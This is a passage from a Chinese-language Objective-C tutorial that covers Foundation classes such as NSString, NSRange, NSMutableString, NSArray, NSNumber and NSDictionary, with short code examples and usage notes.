比较左右两边的数据是否相同.</p><p>​                      -&gt;  10 == 10  这个时候直接比较的是左右两边的数据是否相同.</p><p>​                      -&gt;  a == b  两边也可以写1个变量.这个时候比较是左右两边的变量的值是否相同.</p><p>​                      -&gt;  如果两边是1个指针变量.那么比较的也是变量的值. 只不过指针变量的值是地址.</p><p>​             c. 所以,如果我们要比较两个OC字符串的内容是否相同.不能使用 == 去比较.</p><p>​              因为 == 比较的是字符串指针变量的值.而我们要比的是两个字符串指针指向的字符串对象的内容是否相同.</p><p>​             c. 调用方法: </p><p>​                      - (BOOL)<strong>isEqualToString</strong>:(NSString *)aString;</p><p>​                      就可以比较当前字符串对象和传入的字符串对象的内容是否相同.</p><pre><code>           5). 将C语言的字符串转换为OC字符串对象.</code></pre><p>​                     + (instancetype)<strong>stringWithUTF8String</strong>:(NSString *)string;</p><pre><code>           6). 将OC字符串对象转换为C语言的字符串.</code></pre><p>​                     @property (nullable, readonly) __strong const char *<strong>UTF8String</strong></p><p>​                    char* str1=str.UTF8String;</p><h3 id="NSString常用方法"><a href="#NSString常用方法" class="headerlink" title="NSString常用方法"></a>NSString常用方法</h3><ol><li><p>将字符串写入到指定的文件中.</p><pre><code>    \- (BOOL)writeToFile:(NSString *)path atomically:(BOOL)useAuxiliaryFile encoding:(NSStringEncoding)enc error:(NSError **)error;</code></pre></li><li><p>将文件中的内容读取到字符串中.</p><pre><code>    \+ (nullable instancetype)stringWithContentsOfFile:(NSString *)path encoding:(NSStringEncoding)enc error:(NSError **)error;     nullable 代表返回的对象有可能是nil</code></pre></li><li><p>使用<strong>NSURL</strong>读写资源.</p><pre><code>    1). NSURL对象. 专门用来保存资源地址的. 资源地址: 本地磁盘路径、网页地址、ftp文件地址.    2). 资源路径的地址的写法:</code></pre></li></ol><p>​                     http://  开头的是网页路径的写法.</p><p>​                     file://  开头的是本地磁盘的路径</p><p>​                     ftp://   开头的是ftp文件资源的路径</p><p>​                     如果要讲1个资源路径的地址保存到NSURL对象中 地址一定要是标准写法.</p><pre><code>       3). 如何将资源地址存储到NSURL对象中.</code></pre><p>​                     NSURL *url1 = [NSURL <strong>URLWithString</strong>:@”<a href="http://www.itcast.cn&quot;]">http://www.itcast.cn&quot;]</a>;</p><p>​                     NSURL *url2 = [NSURL URLWithString:@”<a href="ftp://server.itcast.cn/ccc.txt&quot;]">ftp://server.itcast.cn/ccc.txt&quot;]</a>;</p><p>​                     NSURL *url3 = [NSURL URLWithString:@”file:///Users/Apple/Desktop/abc.txt”];</p><pre><code>       4). 字符串就提供了对应的方法去读写NSURL对象中封装的资源路径</code></pre><p>​                     从指定资源路径读取文本内容.</p><p>​                     + (nullable instancetype)<strong>stringWithContentsOfURL</strong>:(NSURL *)url encoding:(NSStringEncoding)enc error:(NSError **)error;</p><p>​                     将字符串的内容写入到资源路径中.</p><p>​                     - (BOOL)writeToURL:(NSURL *)url atomically:(BOOL)useAuxiliaryFile encoding:(NSStringEncoding)enc error:(NSError **)error;</p><p>​                     如果要向网页或者ftp写内容要有权限.</p><ol start="4"><li><p>字符串比较.</p><pre><code>    \- (NSComparisonResult)compare:(NSString *)string;</code></pre></li><li><p>字符串比较:忽略大小写的比较:</p></li><li><p>字符串的相等判断. </p></li><li><p>判断字符串是否以指定的字符串开头</p><pre><code>    \- (BOOL)hasPrefix:(NSString *)str;</code></pre></li><li><p>判断字符串是否以指定的字符串结尾</p><pre><code>    \- (BOOL)hasSuffix:(NSString *)str;</code></pre></li><li><p>在主串中搜索子串.从前往后</p><pre><code>       \- (NSRange)rangeOfString:(NSString *)searchString;            返回值是1个NSRange类型的结构体变量.                       typdef struct _NSRange &#123;</code></pre><p>​                     NSUInteger location; 代表子串在主串出现的下标.</p><p>​                     NSUInteger length; 代表子串在主串中匹配的长度.</p><pre><code>       &#125; NSRange;        如果没有找到:        location 为NSUInteger的最大值, 也就是NSNotFound         length 的值为0        这个方法,是从前往后搜索. 第1次匹配的子串.</code></pre></li><li><p>在主串中搜索子串.从后往前.</p></li></ol><p>​            NSString *str = @”i love itcast love!”;</p><p>​            NSRange range =  [str rangeOfString:@”love” options:NSBackwardsSearch];</p><ol start="11"><li><p>NSRange结构体.</p><pre><code>   1). 是Foundation框架中定义的1个结构体.</code></pre></li></ol><p>​             typedef struct _NSRange {</p><p>​              NSUInteger location;</p><p>​              NSUInteger length;</p><p>​             } NSRange;</p><p>​             NSRange range;</p><p>​             这个结构体变量一般情况下用来表示1段范围.特别用在子串在主串中的范围表示.</p><p>​    @”hahajackhehe” @”jack” </p><p>​     4  4</p><p>​    NSRange range = {4, 4};</p><p>  2). 声明并初始化结构体变量的方式.</p><p>​    1). 最原始的方式.</p><p>​       NSRange range;</p><p>​       range.location = 3;</p><p>​       range.length = 4;</p><p>​    2). 第二种方式:   NSRange range = {3, 7};</p><p>​    3). 第三种方式:  NSRange range = {.location = 3,.length = 7};</p><p>​    4). Foundation框架中定义了1个函数.这个函数可以快速的创建1个NSRange结构体会,</p><p>​      NSRange range =  NSMakeRange(loc, len);</p><p>​      返回1个指定属性的NSRange结构体变量.</p><p>​    5). Foundation框架中定义了1个函数 可以将1个NSRange结构体变量转换为NSString</p><p>​       NSStringFromRange(ran) 函数可以将NSRange结构体变量转换为指定格式的字符串.</p><h3 id="字符串常用成员"><a href="#字符串常用成员" class="headerlink" title="字符串常用成员"></a>字符串常用成员</h3><ol><li><p>字符串的截取.</p><pre><code>    取到字符串中的1部分.     \- (NSString *)**substringFromIndex**:(NSUInteger)from; 从指定的下标出一直截取到最后.     \- (NSString *)**substringToIndex**:(NSUInteger)to; 从第0个开始截取指定的个数.     \- (NSString *)**substringWithRange**:(NSRange)range; 截取指定的1段范围.</code></pre></li><li><p>字符串的替换</p><pre><code>    \- (NSString *)**stringByReplacingOccurrencesOfString**:(NSString *)target withString:(NSString *)replacement     将字符串中第1个参数替换为第2个参数.友情提示: 原来的指针指向字符串的内容是不会变的  会全部替换.     新串是以方法的返回值返回的.     **这个方法还可以做删除. 原理: 将其替换为@&quot;&quot;**</code></pre></li><li><p>字符串数据转换为其他的类型. 使用频率很高.</p><pre><code>    @property (readonly) double doubleValue;</code></pre></li></ol><p>​                    str.doubleValue</p><pre><code>       @property (readonly) float floatValue;</code></pre><p>​                    str.floatValue</p><pre><code>       @property (readonly) int **intValue**;</code></pre><p>​                    str.intValue</p><pre><code>       @property (readonly) NSInteger integerValue          @property (readonly) long long longLongValue          @property (readonly) BOOL boolValue          转换注意. 从头开始转换,能转换多少就是多少. 到遇到不能转换的时候就停止转换.</code></pre><ol start="4"><li><p>去掉字符串前后的空格.</p><pre><code>    str =  [str stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];   中间的空格无法去掉.</code></pre></li></ol><h3 id="NSMutableString"><a href="#NSMutableString" class="headerlink" title="NSMutableString"></a>NSMutableString</h3><ol><li><p>字符串的恒定性.</p><pre><code>一旦创建1个字符串对象,那么这个字符串对象的内容就无法更改, 当我们修改字符串的时候,其实是重新的创建了1个字符串对象.</code></pre><p>代码案例:</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NSLog(@&quot;-------------------&quot;);</span><br><span class="line">NSString *str = @&quot;&quot;; //@&quot;&quot;</span><br><span class="line">for(int i = 0; i &lt; 50000; i++)</span><br><span class="line">&#123;</span><br><span class="line">  str = [NSString stringWithFormat:@&quot;%@%d&quot;,str,i];</span><br><span class="line">&#125;</span><br><span class="line">NSLog(@&quot;-------------------&quot;);</span><br></pre></td></tr></table></figure><pre><code>   会耗费很长的时间. 每次循环的时候 都会创建1个新的字符串对象.50000个,</code></pre><p>   因为字符串的恒定性.</p><ol start="2"><li><p>如何让这样的大批量的字符串拼接可以更加快速的1点.</p><pre><code>   1). 慢得原因: 因为字符串的恒定性,每次修改字符串的时候,是重新的创建1个对象,   2). 希望: 有没有一种对象是用来存储字符串的,并且存储在这个对象中的字符串数据可以更改.</code></pre></li><li><p>NSMutableString</p><pre><code>   1). **是Foundation框架中的1个类.从NSString继承.**</code></pre></li></ol><p>​            所以,NSMutableString对象是用来存储字符串数据的.</p><pre><code>      2). NSMutbaleString在父类NSString的基础之上的做扩展.</code></pre><p>​            <strong>存储在NSSMutableString对象中的字符串数据可以更改.具备可变性</strong>.</p><p>​            直接可以改存储在NSMutableStirng对象中的字符串数据,不会新创建对象.</p><ol start="4"><li><p>NSMutableString的用法</p><pre><code>   1). 既然是1个类,要使用的话,就得创建1个对象.</code></pre></li></ol><p>​            *<em>NSMutableString <em>str = [NSMutableString string];</em></em></p><p>  2). 往可变字符串对象中追加字符串.</p><p>​             *<em>- (void)appendString:(NSString <em>)aString;</em></em>  直接追加内容.</p><p>​             *<em>- (void)appendFormat:(NSString <em>)format</em></em>, … 以拼接的方式往可变字符串对象中追加内容.</p><p>  3). 创建NSMutableString对象的时候,记住下面这样的初始化方式是不行的.</p><p>​            错误：<strong>NSMutableString <em>str = @”jack”;</em></strong>   xxxx</p><p>​            @”jack” 是1个NSString对象,是1个父类对象.</p><p>​            而str指针是1个NSMutableString类型的 是1个子类类型的.    </p><p>​            如果通过子类指针去调用子类独有的成员 就会运行错误.</p><p>  4). NSMutableString从NSString继承.</p><p>​            在使用NSString的地方完全可以使用NSMutableString</p><ol start="5"><li>使用NSMutableString来做大批量的字符串拼接.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NSLog(@&quot;~~~~~~~~~~~~&quot;);</span><br><span class="line">NSMutableString *str = [NSMutableString string];</span><br><span class="line">for(int i = 0; i &lt; 100000; i++)</span><br><span class="line">&#123;</span><br><span class="line"> [str appendFormat:@&quot;%d&quot;,i];</span><br><span class="line">&#125;</span><br><span class="line">NSLog(@&quot;~~~~~~~~~~~~&quot;);</span><br></pre></td></tr></table></figure><pre><code>      这个时候 &quot;biu&quot;的一下就结束了. 为什么这么快&gt;? 因为NSMutableString只有1个.每次修改的时候 直接修改的是这个对象中的数据.</code></pre><ol start="6"><li><p>使用建议</p><pre><code>   1). 我们平时使用的时候,还是使用NSString. 因为效率高.</code></pre></li></ol><p>​                NSString *str1 = @”jack”;</p><p>​                NSString *str2 = @”jack”;</p><pre><code>      2). NSMutbaleString: 只在做大批量的字符串拼接的时候才使用.</code></pre><p>​    大量拼接的时候,就不要去使用NSString 因为效率低下.\</p><p>​    10次以上.</p><h3 id="NSArray"><a href="#NSArray" class="headerlink" title="NSArray"></a>NSArray</h3><ol><li><p>回忆C语言中的数组</p><p>特点:</p><pre><code>    a. 存储多个数据.     b. 类型相同.     c. 长度固定.     d. 每1个元素都是紧密相连的.</code></pre></li><li><p>NSArray</p><pre><code>    1). 是Foundation框架中的一个类.这个类的对象是来存储多个数据的,具备数组的功能.</code></pre></li></ol><p>​             所以,NSArray是OC中的数组.</p><pre><code>       2). 特点:</code></pre><p>​                     a. <strong>只能存储OC对象.任意的OC对象</strong> </p><p>​                     b. <strong>长度固定</strong>. 一旦NSArray数组创建完毕之后,元素的长度固定,无法新增 无法删除元素.</p><p>​                     c. 每1个元素都是紧密相连的. 每1个元素仍然有自己的下标.</p><p>​                     d. <strong>元素的类型是id类型的.</strong></p><ol start="3"><li><p>NSArray数组的创建.</p><pre><code>    1). 因为这是1个类,所以当然就是创建NSArray对象.</code></pre></li></ol><p>​                     NSArray *arr1 = [NSArray new];</p><p>​                     NSArray *arr2 = [[NSArray alloc] init];</p><p>​                     NSArray *arr3 = [NSArray array];</p><p>​                     这样创建出来的NSArray数组的元素的个数是0个,因为长度固定.所以没有任何意义</p><pre><code>       2). 创建数组的同时指定1个数组的元素</code></pre><p>​                     + (instancetype)<strong>arrayWithObject:</strong>(ObjectType)anObject</p><p>​                     NSArray *arr = [NSArray arrayWithObject:@”jack”];</p><p>​                     仍然没有意义,因为这个数组中只有1个元素</p><pre><code>       3). 最常用的创建NSArray数组的方式.</code></pre><p>​                     + (instancetype)<strong>arrayWithObjects:</strong>(ObjectType)firstObj, …</p><p>​                     *<em>NSArray <em>arr = [NSArray arrayWithObjects:@”jack”,@”rose”,@”lili”,@”hanmeimei”,nil];</em></em></p><p>​             使用注意</p><p>​             1). 只能存储OC对象.不能存储非OC对象.</p><p>​             2). <strong>将元素写完以后,最后要写1个nil 表示元素到此结束了.</strong></p><pre><code>         3). 创建NSArray数组的简要方式.</code></pre><p>​                     *<em>NSArray <em>arr = @[写上每1个元素的值用逗号分隔.];</em></em></p><p>​                     NSArray *arr = @[@”jack”,@”rose”,@”lili”];</p><p>​                     <strong>注意:  这种创建方式 不需要在最后加nil</strong></p><ol start="4"><li><p>NSArray数组的使用.</p><pre><code>    1). 在NSLog函数中**使用%@可以直接输出NSArray对象中的所有的元素的值**.    2). NSArray数组中不能存储基本数据类型.不能存储非OC对象.</code></pre></li></ol><p>​                     nil的本质其实就是0 所以nil无法存储到NSArray数组中.</p><pre><code>       3). 这样创建数组没有任何意义.</code></pre><p>​                       NSArray *arr1 = [NSArray new];</p><p>​                       NSArray *arr2 = [[NSArray alloc] init];</p><p>​                       NSArray *arr3 = [NSArray array];</p><p>​             这些数组是没有元素的 而NSArray数组元素无法新增和删除,所以没有任何意义.</p><ol start="5"><li><p>取出存储在NSArray数组中的元素的值.</p><pre><code>    1). 可以使用下标取出对应的元素的值.</code></pre></li></ol><p>​                     *<em>NSArray <em>arr = @[@”jack”,@”rose”,@”lili”];</em></em></p><p>​                     NSLog(@”%@”,arr[0]);</p><p>​                     NSLog(@”%@”,arr[1]);</p><p>​                     NSLog(@”%@”,arr[2]);</p><p>​                     如果下标越界 就直接运行报错.</p><pre><code>       2). 调用数组对象的对象方法来取出指定下标的元素的值.</code></pre><p>​                    - (ObjectType)objectAtIndex:(NSUInteger)index;</p><p>​                     NSArray *arr = @[@”jack”,@”rose”,@”lili”];</p><p>​                     NSString *str = [arr objectAtIndex:3];</p><p>​                     NSLog(@”%@”,str);</p><ol start="6"><li><p>NSArray数组的其他的常用方法</p><pre><code>    1). 得到NSArray数组中的元素的个数.</code></pre></li></ol><p>​             @property (readonly) NSUInteger <strong>count</strong>;</p><pre><code>       2). 判断NSArray数组中是否包含指定的元素.</code></pre><p>​             - (BOOL)<strong>containsObject</strong>:(ObjectType)anObject;</p><pre><code>       3). 取到NSArray数组中的第1个元素.</code></pre><p>​             @property (nullable, nonatomic, readonly) ObjectType <strong>firstObject</strong></p><p>​             与arr[0]的区别.</p><p>​             如果数组中没有任何元素.arr[0]报错. firstObject取到nil 不报错.</p><pre><code>       4). 取到NSArray数组中的最后1个元素.</code></pre><p>​             @property (nullable, nonatomic, readonly) ObjectType lastObject</p><pre><code>       5). 查找指定的元素在NSArray数组中第一次出现的下标.</code></pre><p>​             - (NSUInteger)indexOfObject:(ObjectType)anObject;</p><p>​             如果没有找到 返回的是NSUInteger的最大值.</p><ol start="7"><li><p>NSArray数组的遍历.</p><pre><code>    1). 使用for循环来遍历数组中的每1个元素.</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NSArray *arr = @[@&quot;jack&quot;,@&quot;rose&quot;,@&quot;lili&quot;,@&quot;jack&quot;,@&quot;rose&quot;,@&quot;lili&quot;];</span><br><span class="line">   for(int i = 0; i &lt; arr.count; i++)</span><br><span class="line">   &#123;</span><br><span class="line">     //NSLog(@&quot;%@&quot;,arr[i]);</span><br><span class="line">     NSLog(@&quot;%@&quot;,[arr objectAtIndex:i]);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>​                     原理: 将下标挨个挨个遍历出来 取值.</p><pre><code>       2). 使用增强for循环来遍历NSArray数组中的元素.</code></pre><p>​                 a. 语法格式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      for(元素类型 变量名 in 数组名)</span><br><span class="line">      &#123;</span><br><span class="line">        直接通过变量名就可以拿到数组中的每1个元素.</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">for(NSString* str in arr)&#123;</span><br><span class="line">        NSLog(@&quot;%@&quot;,str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​                 b. 声明在for()中的变量叫做迭代变量.</p><p>​                 c. 执行的原理.  </p><p>​                      将数组中的第1个元素的值赋值给迭代变量.执行循环体.  </p><p>​                      将数组中的第2个元素的值赋值给迭代变量.执行循环体. </p><p>​                      将数组中的第3个元素的值赋值给迭代变量.执行循环体.  </p><p>​                      …….</p><p>​                      将数组中的最后1个元素的值赋值给迭代变量.执行循环体.  </p><p>​                      结束循环.</p><p>​                 d. 语法总结:</p><p>​                      -&gt; 迭代变量的类型和数组中的元素的类型保持一致.</p><p>​                      -&gt; 迭代变量的名称可以任意取,根据自己的爱好.</p><p>​                      -&gt; in是固定的.</p><p>​                      -&gt; 遍历那1个数组,就降数组写在in后面.</p><p>​                      -&gt; 循环体里面.迭代变量的值就是元素的值.</p><p>​             当NSArray数组中存储的数据的类型不一致时候 迭代变量的类型建议使用id类型.</p><pre><code>       3). 使用block遍历.</code></pre><p>​             - (void)<strong>enumerateObjectsUsingBlock</strong>:(void (^)(ObjectType obj, NSUInteger idx, BOOL *stop))block</p><p>​             <strong>这是1个方法.这个方法的作用就是来遍历数组中的每1个元素.</strong></p><ol start="8"><li><p>NSArray与字符串的两个方法</p><pre><code>    1). 将数组中的元素连接起来组成1个新的字符串.</code></pre></li></ol><p>​                 - (NSString *)componentsJoinedByString:(NSString *)separator</p><p>​             参数: 连接符.</p><pre><code>       2). 将字符串以指定的分隔符分成1个数组. 每1部分就是数组的1个元素.    </code></pre><p>​                 - (NSArray&lt;NSString *&gt; *)componentsSeparatedByString:(NSString *)separator;</p><h3 id="NSMutableArray"><a href="#NSMutableArray" class="headerlink" title="NSMutableArray"></a>NSMutableArray</h3><ol><li><p>NSMutableArray是NSArray的子类.</p><pre><code>       1). NSMutableArray仍然是1个数组.具备NSArray数组的特点.</code></pre><p>​             只能存储OC对象.每1个元素的紧密相连的.</p><pre><code>       2). NSMutableArray相对于父类做的扩展:**NSMutableArray数组的元素可以动态的新增和删掉.**</code></pre><p>​             其他的用法均与NSArray一致.</p><p>​             所以: NSArray数组一旦创建,其元素的个数就固定,无法新增删除.</p><p>​            NSMutableArray数组.元素可以新增 可以删除. 其他用法和父类一样.</p></li><li><p>NSMutableArray数组的创建.</p><pre><code>            NSMutableArray *arr1 = [NSMutableArray new];           NSMutableArray *arr2 = [[NSMutableArray alloc] init];           NSMutableArray *arr3 = [NSMutableArray array];           这样创建出来的数组对象.数组的元素是0 仍然是有意义的 因为我们可以动态的新增和删除元素           也可以使用这样的方式来创建可变数组对象.这个数组的元素可以新增和删除.           NSMutableArray *arr4 = [NSMutableArray arrayWithObjects:@&quot;jack&quot;,@&quot;rose&quot;,@&quot;lili&quot;, nil];           最容易犯错:这样写是不可以的           NSMutableArray *arr5 = @[@&quot;jack&quot;,@&quot;rose&quot;,@&quot;lili&quot;];           @[@&quot;jack&quot;,@&quot;rose&quot;,@&quot;lili&quot;];这是1个NSArray对象.           arr5是1个子类指针. 子类指针指向父类对象的就有可能会出问题.</code></pre></li></ol><p> ———插入———</p><p> \1. 任意的指针其实可以指向任意的对象.  编译不会报错 只会给1个警告.</p><p> \2. 虽然语法上可以乱指.但是你千万别乱指.因为运行的适合可能出错.</p><p>  当我们调用指针类型特有的方法的时候</p><p> -———————–</p><p> \3.  如何往可变数组中新增元素.</p><p>   - (void)<strong>addObject</strong>:(ObjectType)anObject; 将传入的参数作为数组的元素添加进去.</p><p> \4.  将另外1个数组中的每1个元素添加到可变数组中.</p><p>   - (void)<strong>addObjectsFromArray</strong>:(NSArray<ObjectType> *)otherArray;</p><p> \5. 在可变数组中指定的下标出插入1个元素.</p><p>  - (void)<strong>insertObject</strong>:(ObjectType)anObject <strong>atIndex:</strong>(NSUInteger)index;</p><p> -————-</p><p> \6. 删除可变数组中指定下标的元素.</p><p>  - (void)removeObjectAtIndex:(NSUInteger)index;</p><p> \7. 删除可变数组中所有的指定的元素.</p><p>  - (void)removeObject:(ObjectType)anObject;</p><p> \8. 删除指定范围中的所有指定元素.</p><p>  - (void)removeObject:(ObjectType)anObject inRange:(NSRange)range;</p><p> \9. 删除最后1个元素</p><p>  - (void)removeLastObject;</p><p> \10.删除所有的元素.</p><p>  - (void)removeAllObjects;</p><h3 id="NSNumber"><a href="#NSNumber" class="headerlink" title="NSNumber"></a>NSNumber</h3><ol><li><p>无论是NSArray还是NSMutbaleArray里面都只能存储OC对象.</p><pre><code>    基本数据类型是无法存储的.</code></pre></li><li><p>如何将基本数据类型的数据存储到NSArray数组中.</p></li><li><p>自定义包装类来包装基本数据类型.</p><pre><code>    定义1个类,这个类的对象的作用是用来存储1个int类型的数据.再将这个对象存储到NSArray数组中.</code></pre></li><li><p>NSNumber是Foundation框架中定义好的1个类.这个类的对象的作用就是用来包装基本数据类型的.</p><pre><code>    将基本数据类型存储到NSArray数组中的步骤.    1). 先讲基本数据类型包装到NSNumber对象中.    2). 再降NSNumber对象存储到NSArray数组中</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NSNumber *number1 = [NSNumber numberWithFloat:10.1f];</span><br><span class="line">NSNumber *number2 = [NSNumber numberWithFloat:10.2f];</span><br><span class="line">NSNumber *number3 = [NSNumber numberWithFloat:10.3f];</span><br><span class="line">  NSArray *arr = @[number1,number2,number3];</span><br><span class="line">  for(NSNumber *num in arr)</span><br><span class="line">  &#123;</span><br><span class="line">     NSLog(@&quot;%f&quot;,num.floatValue);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><p>简写方式.</p><pre><code>    创建NSNumber对象的简写方式:    @10;  代表是1个NSNumber对象.这个对象中包装的是整形的10</code></pre></li></ol><p>​           这个不是整形的10</p><pre><code>       [NSNumber numberWithInt:10];      包装注意:           如果后面的数据是1个变量 那么这个变量就必须要使用小括弧括起来.          @(10);          int num = 10;          @(num)</code></pre><h3 id="NSDictionary"><a href="#NSDictionary" class="headerlink" title="NSDictionary"></a>NSDictionary</h3><ol><li><p>NSArray与NSMutableArray 是OC中的数组.</p><pre><code>    存储数据的特点:  每1个元素紧密相连.并且每1个元素中都是直接存储的值.     缺点: 数组元素的下标不固定.都有可能会发生变化.无法通过下标来唯一确定数组中的元素.     希望: 有一种存储数据的方式 存储到数组中.可以快速唯一的确定数组的元素.     存储数据的时候.必须要为存储的数据取1个别名.     这个别名的作用: 就是用来确定别名对应的数据的.     要找存储在数组中的数据. 使用别名来找 而不是通过下标来找 因为下标有可能会发生变化.     这种存储数据的方式 就叫做 键值对 的存储方式     Key-Value     Key 就是键 就是为数据取得别名.     Value 就是值 就是真正存储的数据.</code></pre></li><li><p>NSDictionary 与 NSMutableDictionary</p><pre><code>    1). 它们是数组. 它们就是以键值对的形式存储数据的.</code></pre></li></ol><p>​             往这个数组中存储数据的同时.必须要指定这个数据的别名才可以.</p><p>​             <strong>要找到存储在这个数组中的数据 通过别名来找 而不是通过下标.</strong></p><ol start="3"><li><p>NSDictionary 字典数组</p><pre><code>    1). 存储数据的原理.</code></pre></li></ol><p>​                     a. 以键值对的形式存储数据.</p><p>​                     b. 字典数组一旦创建,其中的元素就无法动态的新增和删除.</p><p>​                     c. 键: 只能是遵守了NSCoping协议的对象. 而NSString就是遵守了这个协议.</p><p>​                      值: 只能是OC对象.</p><pre><code>       2). 创建字典数组</code></pre><p>​                     NSDictionary *dict1 = [NSDictionary new];</p><p>​                     NSDictionary *dict2 = [[NSDictionary alloc] init];</p><p>​                     NSDictionary *dict3 = [NSDictionary dictionary];</p><p>​                     <strong>这种方式创建出来的字典数组中没有任何元素.所以没有意义.</strong></p><pre><code>       3). 一般创建方式</code></pre><p>​                     + (instancetype)dictionaryWithObjectsAndKeys:(id)firstObject, …</p><p>​                     将字典数组的值键 挨个的写在后面初始化.</p><p>​         NSDictionary *dict = [NSDictionary dictionaryWithObjectsAndKeys:@”jack”,@”name”,@”北京市XX街道”,@”address”, nil];</p><pre><code>       4). 简要创建方式</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NSDictionary *dict = @&#123;键1:值1,键2:值2,键3:值3,........&#125;;</span><br><span class="line">NSDictionary *dict=@&#123;@&quot;name&quot;:@&quot;rose&quot;,@&quot;age&quot;:@&quot;18&quot;,@&quot;address&quot;:@&quot;BeiJingXXSttreet&quot;&#125;;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>使用字典数组.</p><pre><code>    1). 如何取出存储在字典数组中的数据.</code></pre></li></ol><p>​                     a. 存储在字典数组中的元素不能使用下标去取 而是用键 也就是别名去取.</p><p>​                     -&gt; 使用中括弧的方式.</p><p>​                      字典数组名[键]; 这样就可以去到字典数组中这个键对应的值.</p><p>​                      <strong>NSLog(@”%@”,dict[@”name”]);</strong> 取出dict字典数组中@”name”这个键对应的值</p><p>​                     -&gt; 调用字典数组对象的方法也可以取出键对应的值.</p><p>​                      <strong>- (nullable ObjectType)objectForKey:(KeyType)aKey;</strong></p><p>​                    如果给定的key在数组中不存在,取到的值是nil 不会报错.</p><pre><code>       2). 取到字典数组的键值对的个数.</code></pre><p>​                     @property (readonly) NSUInteger count;</p><pre><code>       3). 往字典数组中存储键值对的时候 键不允许重复</code></pre><p>​                     如果键重复: 后加的无效.. ???????????????</p><ol start="5"><li><p>遍历字典数组</p><pre><code>    1). 字典数组中的数据无法使用下标去取 所以普通的for循环遍历下标发就无用武之地了.    2). 使用for in循环. **遍历出来的是字典数组中所有的键. 再通过键取出对应的值.**</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">NSDictionary *dict = @&#123;</span><br><span class="line">    @&quot;name&quot;:@&quot;rose&quot;,</span><br><span class="line">    @&quot;age&quot;:@&quot;18&quot;,</span><br><span class="line">    @&quot;address&quot;:@&quot;BeiJingXXSttreet&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">for(id item in dict)</span><br><span class="line">&#123;</span><br><span class="line">   NSLog(@&quot;%@ = %@&quot;,item,dict[item]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>      3). 使用block遍历.</code></pre><p>​             [dict <strong>enumerateKeysAndObjectsUsingBlock</strong>:^(id  _Nonnull <strong>key</strong>, id  _Nonnull <strong>obj</strong>, BOOL * _Nonnull <strong>stop</strong>) {</p><p>​        NSLog(@”%@ = %@”,key,obj);</p><p>​             }];</p><ol start="6"><li><p>字典数组存储数据的原理.</p><pre><code>    1). 当往字典数组中存储1个键值对的时候,这个键值对应该存储在下标为几的元素中呢?</code></pre></li></ol><p>​                     -&gt; 并不是按照顺序挨个挨个的存储的.</p><p>​                     -&gt; 存储键值对的时候,会根据键和数组的长度做1个哈希算法.算出1个下标.将这个键值对存储在该下标处.</p><pre><code>       2). 取值的时候:</code></pre><p>​                     也是根据键做1个哈希算法.就可以算出这个键值对存储的下标 然后直接找到这个下标的数据取出就可以了</p><pre><code>       与NSArray对比                  1). NSArray数组的元素 挨个挨个的屁股后面. 按照顺序来存储的.</code></pre><p>​                     字典数组中不是挨个挨个的存储的.存储的下标是算出来的</p><pre><code>               2). **存的效率: 肯定是NSArray要高一些.**</code></pre><p>​                     取得时候: 如果取值的时候,是全部一股脑的取出来.这个时候NSArray块一些.</p><p>​                     如果取值的时候.只会取数组中指定的几个元素.字典数组取值更快一些.</p><pre><code>      什么时候是有NSArray 什么时候使用字典数组?        存储进去之后,一旦要取值.就是全部取出. NSArray        存储进去之后.取值只会取指定的几个元素 字典数组.</code></pre><p> -————————————————–</p><h3 id="NSMutableDictionary"><a href="#NSMutableDictionary" class="headerlink" title="NSMutableDictionary"></a>NSMutableDictionary</h3><ol><li><p>NSMutableDictionary</p><pre><code>   1). 是NSDictionary的子类.所以NSMutableDictionary也是1个字典数组,也是以键值对的形式存储数据的.   2). 重点:NSMutableDictionary在父类基础之上做的扩张:</code></pre></li></ol><p>​                    <strong>存储在其中的元素可以动态的新增和删除.</strong></p><pre><code>      3). 创建可变字典数组.</code></pre><p>​                     NSMutableDictionary *dict1 = [NSMutableDictionary new];</p><p>​                     NSMutableDictionary *dict2 = [[NSMutableDictionary alloc] init];</p><p>​                     NSMutableDictionary *dict3 = [NSMutableDictionary dictionary];</p><p>​                     这样创建出来的可变字典数组的长度为0 但是有意义 因为可以动态的新增和删除.</p><p>​                     *<em>NSMutableDictionary <em>dict = [NSMutableDictionary dictionaryWithObjectsAndKeys:@”jack”,@”name”,@”18”,@”age”, nil];</em></em></p><p>​                     